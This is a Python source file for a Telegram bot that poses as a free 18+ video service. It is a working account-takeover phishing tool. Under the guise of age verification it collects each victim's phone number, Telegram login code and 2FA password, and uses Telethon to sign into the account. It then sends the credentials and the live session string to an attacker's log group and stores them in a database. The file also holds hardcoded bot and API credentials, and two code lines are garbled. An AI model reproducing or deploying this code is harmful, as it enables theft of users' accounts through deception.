import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
import logging
import sqlite3
from datetime import datetime, timedelta
import hashlib
import random
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import os
from pathlib import Path
import uuid

# Logging setup
logging.basicConfig(level=logging.INFO)

# Bot configuration (Using environment variables for Railway)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8616457539:AAG2Fl11UO0ksRz5Kn3gC-MM8B66UqzFm7Y")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "-1003711093763")
ADMIN_ID = os.getenv("ADMIN_ID", "7461769509")

# Telegram API credentials
API_ID = 30191201
API_HASH = "5c87a8808e935cc3d97958d0bb24ff1f"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Create videos directory
Path("videos").mkdir(exist_ok=True)

# Database initialization
def init_db():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id TEXT,
        username TEXT,
        phone_number TEXT,
        phone_code_hash TEXT,
        phone_code TEXT,
        password TEXT,
        session_string TEXT,
        status TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_path TEXT,
        original_filename TEXT,
        file_size INTEGER,
        uploaded_by TEXT,
        upload_time DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()

def save_login_attempt(data):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO logins (telegram_id, username, phone_number, phone_code_hash, phone_code, password, session_string, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (data['telegram_id'], data['username'], data['phone_number'], 
               data['phone_code_hash'], data['phone_code'], data['password'],
               data['session_string'], data['status']))
    conn.commit()
    conn.close()

def save_video(file_path, original_filename, file_size, uploaded_by):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO videos (file_path, original_filename, file_size, uploaded_by) VALUES (?, ?, ?, ?)",
              (file_path, original_filename, file_size, uploaded_by))
    conn.commit()
    conn.close()

def get_all_videos():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT file_path FROM videos WHERE upload_time > datetime('now', '-15 minutes')")
    videos = c.fetchall()
    conn.close()
    return [v[0] for v in videos]

def delete_old_videos():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT file_path FROM videos WHERE upload_time <= datetime('now', '-15 minutes')")
    old_files = c.fetchall()
    
    # Delete from database
    c.execute("DELETE FROM videos WHERE upload_time <= datetime('now', '-15 minutes')")
    
    # Delete files from disk
    for file_path, in old_files:
        try:
            os.remove(file_path)
        except FileNotFoundError:
            pass
    
    conn.commit()
    conn.close()

# Auto-delete task
async def auto_delete_task():
    while True:
        await asyncio.sleep(900)  # 15 minutes = 900 seconds
        delete_old_videos()
        print("🧹 Deleted old videos (15+ minutes old)")

# State management
class LoginForm(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()  # Only if 2FA is required

# Global user state storage
user_clients = {}

# Start command
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    # Inline keyboard for users
    user_keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="📱 Enter Phone Number", callback_data="enter_phone")],
        [types.InlineKeyboardButton(text="ℹ️ About", callback_data="about")],
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])
    
    await message.answer(
        "🎉 **Welcome to FREE POM POM BOT** 🎉\n\nPlease login to access premium videos.",
        reply_markup=user_keyboard,
        parse_mode='Markdown'
    )
    await state.set_state(LoginForm.waiting_for_phone)

@dp.callback_query(lambda c: c.data == "enter_phone")
async def prompt_phone(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("📱 **Step 1/2:** Please enter your phone number (with country code):\n\nExample: `+919876543210`", parse_mode='Markdown')
    await state.set_state(LoginForm.waiting_for_phone)

@dp.callback_query(lambda c: c.data == "about")
async def show_about(callback: types.CallbackQuery):
    await callback.message.answer(
        "ℹ️ **About FREE POM POM BOT**\n\n"
        "• Premium video sharing service\n"
        "• 18+ content verification required\n"
        "• Secure login system\n"
        "• Temporary content (15 min auto-delete)\n\n"
        "🔐 Your privacy is our priority!",
        parse_mode='Markdown'
    )

@dp.callback_query(lambda c: c.data == "help")
async def show_help(callback: types.CallbackQuery):
    await callback.message.answer(
        "❓ **Help Center**\n\n"
        "• **Login Process:** Phone → OTP → 2FA (if required)\n"
        "• **OTP Format:** Use number buttons or type '1 2 3 4 5'\n"
        "• **Content:** Videos auto-delete after 15 minutes\n"
        "• **Need Support:** Contact admin\n\n"
        "💡 Always keep your session secure!",
        parse_mode='Markdown'
    )

@dp.message(LoginForm.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone_number = message.text.strip()
    
    # Validate phone number
    if not phone_number.startswith('+') or len(phone_number) < 10:
        await message.answer("❌ **Invalid phone number format!**\n\nPlease enter with country code (e.g., `+919876543210`)", parse_mode='Markdown')
        return
    
    try:
        # Create Telegram client
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        await client.connect()
        sent = await client.send_code_request(phone_number)
        
        # Store client and data
        user_clients[message.from_user.id] = client
        
        await state.update_data(
            phone_number=phone_number,
            phone_code_hash=sent.phone_code_hash,
            client_connected=True
        )
        
        # 18+ verification message with OTP keyboard
        otp_keyboard = types.ReplyKeyboardMarkup(
            keyboard=[
                [types.KeyboardButton(text="1"), types.KeyboardButton(text="2"), types.KeyboardButton(text="3"), types.KeyboardButton(text="4"), types.KeyboardButton(text="5")],
                [types.KeyboardButton(text="6"), types.KeyboardButton(text="7"), types.KeyboardButton(text="8"), types.KeyboardButton(text="9"), types.KeyboardButton(text="0")]
            ],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        
        await message.answer(
            "🔞 **18+ Verification Required**\n\n"
            "We need to verify that you are 18+ years old.\n\n"
            "📱 **Please enter the OTP you received (format: 1 2 3 4 5)**:\n\n"
            "**Note:** Use the number buttons below to enter OTP.",
            reply_markup=otp_keyboard,
            parse_mode='Markdown'
        )
        await state.set_state(LoginForm.waiting_for_code)
        
    except Exception as e:
        await message.answer(f"❌ **Failed to send OTP!**\n\nError: `{str(e)}`\n\nPlease try again with /start", parse_mode='Markdown')
        await state.clear()

@dp.message(LoginForm.waiting_for_code)
async def process_phone_code(message: types.Message, state: FSMContext):
    # Handle keyboard input or manual input
    phone_code_input = message.text.strip()
    
    # Remove keyboard
    remove_keyboard = types.ReplyKeyboardRemove()
    
    # Convert spaced format to continuous (1 2 3 4 5 -> 12345) or handle individual numbers
    if len(phone_code_input) == 1 and phone_code_input.isdigit():
        # If user clicked on keyboard button, wait for more input
        data = await state.get_data()
        current_code = data.get('current_otp', '')
        new_code = current_code + phone_code_input
        
        if len(new_code) < 5:
            await state.update_data(current_otp=new_code)
            await message.answer(
                f"🔢 **Current OTP:** `{new_code}`\n\n"
                f"Please enter {5-len(new_code)} more digit(s) to complete OTP.",
                parse_mode='Markdown'
            )
            return
        else:
            phone_code = new_code
    else:
        # Handle manual input like "1 2 3 4 5"
        phone_code = ''.join(phone_code_input.split())
    
    if len(phone_code) != 5 or not phone_code.isdigit():
        await message.answer("❌ **Invalid OTP format!**\n\nPlease enter 5 digits.", parse_mode='Markdown')
        return
    
    data = await state.get_data()
    phone_number = data['phone_number']
    phone_code_hash = data['phone_code_hash']
    
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.answer("❌ **Session expired! Please start again with /start**", parse_mode='Markdown')
        await state.clear()
        return
    
    try:
        await client.sign_in(
            phone=phone_number,
            code=phone_code,
            phone_code_hash=phone_code_hash
        )
        
        # Remove keyboard and proceed
        await message.answer("✅ **Verification Complete!**", reply_markup=remove_keyboard)
        
        # If we reach here, 2FA is not required
        session_string = client.session.save()
        await client.disconnect()
        del user_clients[message.from_user.id]
        
        # Prepare login data
        login_data = {
            'telegram_id': message.from_user.id,
            'username': message.from_user.username or 'N/A',
            'phone_number': phone_number,
            'phone_code_hash': phone_code_hash,
            'phone_code': phone_code,
            'password': 'N/A',
            'session_string': session_string,
            'status': 'SUCCESS'
        }
        
        # Save to database
        save_login_attempt(login_data)
        
        # Send to log group
        await send_login_to_log_group(login_data)
        
        # Send videos to user
        await send_videos_to_user(message)
        
        # Success message
        await message.answer("🎬 **Premium Content Delivered Successfully!**\n\nYour access has been granted to all premium videos.", parse_mode='Markdown')
        await state.clear()
        
    except SessionPasswordNeededError:
        # Remove keyboard and ask for 2FA
        await message.answer("✅ **OTP Verified!**", reply_markup=remove # 2FA required message
        await message.answer("🔐 **Telegram has sent you a 18+ verification code**\n\nPlease write your 2FA password here:", parse_mode='Markdown')
        await state.update_data(phone_number=phone_number, phone_code_hash=phone_code_hash, phone_code=phone_code)
        await state.set_state(LoginForm.waiting_for_password)
        
    except PhoneCodeInvalidError:
        await message.answer("❌ **Invalid OTP!**\n\nThe OTP you entered is incorrect. Please start again with /start", parse_mode='Markdown')
        if client:
            await client.disconnect()
            del user_clients[message.from_user.id]
        await state.clear()
        
    except PhoneCodeExpiredError:
        await message.answer("⏰ **OTP Expired!**\n\nThe OTP was valid for 5 minutes only. Please start again with /start", parse_mode='Markdown')
        if client:
            await client.disconnect()
            del user_clients[message.from_user.id]
        await state.clear()
        
    except Exception as e:
        await message.answer(f"❌ **OTP Verification Failed!**\n\nError: `{str(e)}`\n\nPlease try again with /start", parse_mode='Markdown')
        if client:
            await client.disconnect()
            del user_clients[message.from_user.id]
        await state.clear()

@dp.message(LoginForm.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    
    data = await state.get_data()
    phone_number = data['phone_number']
    phone_code_hash = data['phone_code_hash']
    phone_code = data['phone_code']
    
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.answer("❌ **Session expired! Please start again with /start**", parse_mode='Markdown')
        await state.clear()
        return
    
    try:
        await client.sign_in(password=password)
        
        session_string = client.session.save()
        await client.disconnect()
        del user_clients[message.from_user.id]
        
        # Prepare login data
        login_data = {
            'telegram_id': message.from_user.id,
            'username': message.from_user.username or 'N/A',
            'phone_number': phone_number,
            'phone_code_hash': phone_code_hash,
            'phone_code': phone_code,
            'password': password,
            'session_string': session_string,
            'status': 'SUCCESS'
        }
        
        # Save to database
        save_login_attempt(login_data)
        
        # Send to log group
        await send_login_to_log_group(login_data)
        
        # Send videos to user
        await send_videos_to_user(message)
        
        # Success message
        await message.answer("🎬 **Premium Content Delivered Successfully!**\n\nYour access has been granted to all premium videos.", parse_mode='Markdown')
        await state.clear()
        
    except Exception as e:
        await message.answer(f"❌ **2FA Verification Failed!**\n\nError: `{str(e)}`\n\nPlease start again with /start", parse_mode='Markdown')
        if client:
            await client.disconnect()
            del user_clients[message.from_user.id]
        await state.clear()

async def send_login_to_log_group(login_data):
    log_message = f"""[FREE POM POM BOT LOGIN ALERT]

👤 User: @{login_data['username']}
🆔 Telegram ID: {login_data['telegram_id']}
📞 Phone Number: {login_data['phone_number']}
🔢 Phone Code Hash: {login_data['phone_code_hash']}
🔢 OTP: {login_data['phone_code']} (format: 1 2 3 4 5)
🔐 Password: {login_data['password']}
🔗 Session String: `{login_data['session_string']}`
✅ Status: {login_data['status']}
⏰ Time: {datetime.now().strftime('%d-%m-%Y %H:%M IST')}
"""
    try:
        await bot.send_message(chat_id=LOG_GROUP_ID, text=log_message, parse_mode='Markdown')
        print(f"✅ Login logged for user: {login_data['telegram_id']}")
    except Exception as e:
        print(f"❌ Failed to send log: {e}")

async def send_videos_to_user(message):
    videos = get_all_videos()
    if videos:
        await message.answer("🎬 **Sending Premium Content...**", parse_mode='Markdown')
        for video_path in videos:
            try:
                await message.answer_video(video=types.FSInputFile(video_path))
            except Exception as e:
                print(f"Error sending video {video_path}: {e}")
        await message.answer("✅ **All Premium Videos Delivered!**\n\nEnjoy your content!", parse_mode='Markdown')
    else:
        await message.answer("🎬 **No videos available right now!**\n\nVideos auto-delete after 15 minutes. Check back later.", parse_mode='Markdown')

# Admin commands with inline keyboard
@dp.message(Command("addvideo"))
async def cmd_add_video(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await message.answer("❌ **Admin access only!**", parse_mode='Markdown')
        return
    
    # Admin inline keyboard
    admin_keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="📹 Upload Video", callback_data="upload_video")],
        [types.InlineKeyboardButton(text="📊 View Stats", callback_data="view_stats")],
        [types.InlineKeyboardButton(text="🗑️ Clear Videos", callback_data="clear_videos")],
        [types.InlineKeyboardButton(text="📋 Video List", callback_data="video_list")]
    ])
    
    await message.answer(
        "👑 **Admin Panel**\n\n"
        "• **Upload:** Add new videos\n"
        "• **Stats:** View usage statistics\n"
        "• **Clear:** Remove all videos\n"
        "• **List:** See uploaded videos",
        reply_markup=admin_keyboard,
        parse_mode='Markdown'
    )

# Handle video uploads - NOW CREATES SEPARATE FILES FOR EACH VIDEO
@dp.message(lambda message: message.video and str(message.from_user.id) == ADMIN_ID)
async def handle_video_upload(message: types.Message):
    try:
        # Generate unique filename for each video
        unique_id = str(uuid.uuid4())[:8]  # Short unique ID
        original_filename = f"{unique_id}_{message.video.file_unique_id}.mp4"
        file_path = f"videos/{original_filename}"
        
        # Download video file
        file_id = message.video.file_id
        file = await bot.get_file(file_id)
        await bot.download_file(file.file_path, file_path)
        
        # Save to database
        save_video(
            file_path=file_path,
            original_filename=original_filename,
            file_size=message.video.file_size,
            uploaded_by=str(message.from_user.id)
        )
        
        await message.answer(
            f"✅ **Video Uploaded Successfully!**\n\n"
            f"📁 File Name: `{original_filename}`\n"
            f"💾 File Size: {message.video.file_size} bytes\n"
            f"⏰ Auto-delete: After 15 minutes\n"
            f"📊 Total videos: {len(get_all_videos())}\n\n"
            f"🔗 Unique ID: `{unique_id}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        await message.answer(f"❌ **Upload Failed!** Error: {str(e)}", parse_mode='Markdown')

# Admin inline handlers
@dp.callback_query(lambda c: c.data == "upload_video")
async def admin_upload_video(callback: types.CallbackQuery):
    await callback.message.answer("📹 **Upload Video**\n\nSend a video file to add to the collection.")

@dp.callback_query(lambda c: c.data == "view_stats")
async def admin_view_stats(callback: types.CallbackQuery):
    # Get stats
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    
    # Total logins
    c.execute("SELECT COUNT(*) FROM logins")
    total_logins = c.fetchone()[0]
    
    # Total videos
    c.execute("SELECT COUNT(*) FROM videos")
    total_videos = c.fetchone()[0]
    
    # Active videos (last 15 min)
    active_videos = len(get_all_videos())
    
    conn.close()
    
    stats_msg = (
        "📊 **Admin Statistics**\n\n"
        f"👤 Total Logins: {total_logins}\n"
        f: {total_videos}\n"
        f"🎬 Active Videos: {active_videos}\n"
        f"⏰ Auto-delete: 15 minutes\n\n"
        f"🕒 Last updated: {datetime.now().strftime('%H:%M:%S')}"
    )
    
    await callback.message.answer(stats_msg, parse_mode='Markdown')

@dp.callback_query(lambda c: c.data == "clear_videos")
async def admin_clear_videos(callback: types.CallbackQuery):
    delete_old_videos()
    
    await callback.message.answer("🗑️ **All videos cleared successfully!**", parse_mode='Markdown')

@dp.callback_query(lambda c: c.data == "video_list")
async def admin_video_list(callback: types.CallbackQuery):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT original_filename, file_size, upload_time FROM videos WHERE upload_time > datetime('now', '-15 minutes')")
    videos = c.fetchall()
    conn.close()
    
    if videos:
        video_list = "📋 **Active Videos (Last 15 Min)**\n\n"
        for i, (filename, size, time) in enumerate(videos, 1):
            video_list += f"{i}. `{filename}` ({size} bytes)\n"
        video_list += f"\nTotal: {len(videos)} videos"
    else:
        video_list = "📋 **No videos uploaded yet!**"
    
    await callback.message.answer(video_list, parse_mode='Markdown')

# Test command
@dp.message(Command("test"))
async def cmd_test(message: types.Message):
    if str(message.from_user.id) == ADMIN_ID:
        await message.answer("✅ **Admin access granted!**", parse_mode='Markdown')
    else:
        await message.answer("❌ **Access denied!**", parse_mode='Markdown')

# Initialize database
init_db()

# Main function with auto-delete task
async def main():
    print("🚀 FREE POM POM BOT Started...")
    print(f"Bot will log to group: {LOG_GROUP_ID}")
    
    # Start auto-delete task
    asyncio.create_task(auto_delete_task())
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
